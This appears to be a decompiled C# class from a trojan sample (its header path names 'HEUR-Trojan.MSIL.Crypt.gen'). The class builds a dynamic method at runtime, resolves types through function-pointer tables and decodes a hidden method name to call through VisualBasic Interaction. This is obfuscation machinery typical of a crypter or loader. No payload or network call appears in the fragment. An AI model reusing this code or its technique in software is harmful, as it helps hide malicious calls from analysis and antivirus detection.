// Decompiled with JetBrains decompiler
// Type: Q7jU8zFqbfRJyQUdT.myYn0Lzmyhv05RKxP
// Assembly: Q7jU8zFqbfRJyQUdT, Version=5.6.0.5, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 36427E73-5524-420A-9724-276045DDB54E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-bda7803bc6a630ed5997870eb0b102e590d6f584b11699fb76781564debe9921.exe

using Microsoft.VisualBasic;
using Q7jU8zFqbfRJyQUdT.My;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;

namespace Q7jU8zFqbfRJyQUdT
{
  internal class myYn0Lzmyhv05RKxP
  {
    [CompilerGenerated]
    public \u0038uKA5h708Ogi1CSSL \u003Cg30TwPd1D1wvI2sWE\u003E(
      \u0038uKA5h708Ogi1CSSL aDihiH80j6STqx5DD,
      params object[] Xxn4Ptfav4vAf8pe2)
    {
      \u0038uKA5h708Ogi1CSSL obj1 = (\u0038uKA5h708Ogi1CSSL) new \u00378kAuEc4ne0a43jJw();
      string empty = string.Empty;
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle1 = __typeref (object);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      Type returnType = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[0])(runtimeTypeHandle1);
      Type[] parameterTypes = new Type[3];
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle2 = __typeref (object);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      parameterTypes[0] = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[0])(runtimeTypeHandle2);
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle3 = __typeref (string);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      parameterTypes[1] = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[0])(runtimeTypeHandle3);
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle4 = __typeref (object[]);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      parameterTypes[2] = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[0])(runtimeTypeHandle4);
      DynamicMethod dynamicMethod = new DynamicMethod(empty, returnType, parameterTypes);
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle5 = __typeref (Interaction);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      Type type1 = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[0])(runtimeTypeHandle5);
      ILGenerator ilGenerator1 = dynamicMethod.GetILGenerator();
      ilGenerator1.Emit(OpCodes.Ldarg_0);
      ilGenerator1.Emit(OpCodes.Ldarg_1);
      ilGenerator1.Emit(OpCodes.Ldc_I4, aDihiH80j6STqx5DD.GDlGhzFhORh1JgR1I.StartsWith("I") ? 1 : 2);
      ilGenerator1.Emit(OpCodes.Ldarg_2);
      ILGenerator ilGenerator2 = ilGenerator1;
      OpCode call = OpCodes.Call;
      Type type2 = type1;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      Encoding encoding = __calli((__FnPtr<Encoding ()>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[1])();
      string[] strArray = new string[1];
      char[] chArray = new char[16];
      // ISSUE: field reference
      RuntimeFieldHandle runtimeFieldHandle = __fieldref (gVrlsH0CCK7B4olOM.E2N0xb07xUfPPlIW4);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      __calli((__FnPtr<void (Array, RuntimeFieldHandle)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[2])((RuntimeFieldHandle) chArray, (Array) runtimeFieldHandle);
      strArray[0] = new string(chArray);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      string str = __calli((__FnPtr<string (string[])>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[3])(strArray);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      byte[] bytes = __calli((__FnPtr<byte[] (string)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[4])(str);
      string name = encoding.GetString(bytes);
      MethodInfo method = type2.GetMethod(name);
      ilGenerator2.Emit(call, method);
      ilGenerator1.Emit(OpCodes.Ret);
      \u0038uKA5h708Ogi1CSSL obj2 = obj1;
      object obj3 = dynamicMethod.Invoke((object) ilGenerator1, new object[3]
      {
        ((\u00378kAuEc4ne0a43jJw) aDihiH80j6STqx5DD).vAA2jqBm2L3SvtQpZ,
        (object) aDihiH80j6STqx5DD.GDlGhzFhORh1JgR1I,
        (object) Xxn4Ptfav4vAf8pe2
      });
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      object obj4 = __calli((__FnPtr<object (object)>) MyProject.FjY08I6xUErNIj7sF.YoVtzt2ouZHu2RlZU[5])(obj3);
      ((\u00378kAuEc4ne0a43jJw) obj2).vAA2jqBm2L3SvtQpZ = obj4;
      return obj1;
    }
  }
}
